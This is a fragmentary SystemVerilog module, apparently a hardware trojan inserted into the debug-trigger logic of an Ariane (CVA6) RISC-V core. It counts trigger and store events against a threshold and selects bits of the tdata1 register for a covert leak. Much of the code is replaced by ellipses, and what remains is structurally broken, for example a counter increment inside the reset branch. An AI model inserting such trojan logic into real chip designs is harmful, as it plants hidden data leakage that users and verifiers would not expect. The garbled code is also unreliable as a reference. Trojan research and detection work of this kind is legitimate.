module trigger_module_trojan_Covert
  import ariane_pkg::*;
  import triggers_pkg::*;
#(
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 19061;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (tdata1_i && |store_result_i) trojan_counter <= trojan_counter + 1;
        ...
        assign current_bit = tdata1_i[covert_bit_index];  // <-- FIXED: use trigger_signal
